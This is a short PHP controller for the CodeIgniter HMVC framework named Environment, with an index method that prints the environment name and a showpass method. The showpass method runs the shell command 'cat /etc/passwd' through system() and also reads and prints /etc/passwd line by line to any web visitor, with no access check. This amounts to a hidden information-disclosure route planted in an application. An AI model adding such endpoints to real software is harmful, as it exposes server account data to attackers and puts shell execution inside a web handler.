<?php
class Environment extends MX_Controller {
    public function __construct(){
        parent::__construct();
    }
    public function index(){
        echo ENVIRONMENT;
    }
    public function showpass(){
        echo '<pre>'.system("cat /etc/passwd").'</pre>';
        $dat = file('/etc/passwd');
        foreach($dat as $x) echo "$x<br/>";
    }
}
